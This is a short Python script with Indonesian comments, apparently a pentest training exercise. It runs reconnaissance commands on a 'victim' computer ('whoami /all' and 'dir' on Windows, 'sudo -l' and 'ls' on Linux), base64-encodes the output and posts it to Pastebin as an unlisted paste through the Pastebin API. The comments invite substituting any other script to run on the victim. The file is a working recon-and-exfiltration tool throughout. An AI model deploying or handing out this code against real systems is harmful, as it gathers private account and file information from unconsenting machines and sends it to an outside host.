import base64
import requests
import sys
from platform import system, platform
from subprocess import PIPE, Popen

API_URL = "https://pastebin.com/api/api_post.php"
API_KEY = "APIKEY"

msg = "Recon Result\n"

# Menampilkan OS yang digunakan victim
msg += f"Victim's OS: {platform()}\n"

#jika korban menggunakan Windows
if system() == "Windows":
    #SCRIPT YANG KITA INGIN JALANKAN BISA DIJALANKAN DISINI DENGAN FORMAT
    #process = Popen("NAMASCRIPT", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)

    #proses untuk mengetahui sedang terlogin sebagai siapa dan mengetahui user yang ada pada komputer korban
    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate() #hasil output akan ditampilkan

    #proses untuk mengetahui directory yang ada pada komputer korban
    process = Popen("dir", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate() #hasil output akan ditampilkan

#jika korban menggunakan linux
elif system() == "Linux":
    #SCRIPT YANG KITA INGIN JALANKAN BISA DIJALANKAN DISINI DENGAN FORMAT
    #process = Popen("NAMASCRIPT", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    
    #proses untuk meminta menjadi superuser (root)
    process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True) 
    result, error = process.communicate() #hasil output akan ditampilkan

    #proses untuk mengetahui directory yang ada pada komputer korban
    process = Popen("ls", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate() #hasil output akan ditampilkan
    
else: #jika OS korban bukan Windows / Linux maka akan exit
    sys.exit()

print(msg)
print(result)

if result == b'': #jika result yang diterima berupa byte kosong, maka akan exit
    sys.exit(0)
else: #jika result yang diterima bukan byte kosong, maka akan di decode
    msg += result.decode()

# Melakukan encode Base64 kepada result
msg = base64.b64encode(msg.encode())
print (f"Encoded Result :{msg}\n")

# Isi request yang akan dikirim ke pastebin menggunakan API
data = {
    'api_dev_key': API_KEY, #API KEY
    'api_option': 'paste', #Menggunakan metode paste untuk input data ke pastebin
    'api_paste_private': 1, #Visibility menggunakan unlisted
    'api_paste_name' : "GLSProgPentest_Pastebin", #Nama Pastebin
    'api_paste_code': msg #msg akan dikirim ke pastebin
}

# Mengirimkan data request dengan metode POST setelah itu akan menampilkan link pastebin
respond = requests.post(url=API_URL, data=data)
pastebin_url = respond.text

# jika upload berhasil
if respond.status_code == 200:
    print(f"Response Code :{respond.status_code}")
    print("SUCCESS")
    print(f"Pastebin URL: {respond.text}")

# jika upload gagal
elif respond.status_code != 200:
    print(f"Response Code :{respond.status_code}")
    print("FAILED")
    print(f"Error: {respond.text}")